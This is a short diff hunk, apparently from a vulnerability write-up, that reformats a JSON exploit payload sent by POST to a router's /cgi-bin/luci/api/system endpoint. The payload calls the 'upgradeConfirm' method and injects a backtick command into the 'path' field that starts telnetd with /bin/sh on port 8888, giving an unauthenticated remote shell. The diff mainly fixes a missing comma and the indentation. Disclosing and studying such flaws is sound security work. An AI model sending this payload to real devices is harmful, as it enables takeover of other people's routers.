@@ -48,11 +48,11 @@ Send the following as a `POST` request to the URL `/cgi-bin/luci/api/system`.
 
 ```
 {
-        "method": "upgradeConfirm",
-        "params": {
-            "isPersist": "aaaa"
-            "path": "`telnetd -p 8888 -l /bin/sh`"
-        }
+	"method": "upgradeConfirm",
+	"params": {
+		"isPersist": "aaaa",
+		"path": "`telnetd -p 8888 -l /bin/sh`"
+	}
 }
 ```
 
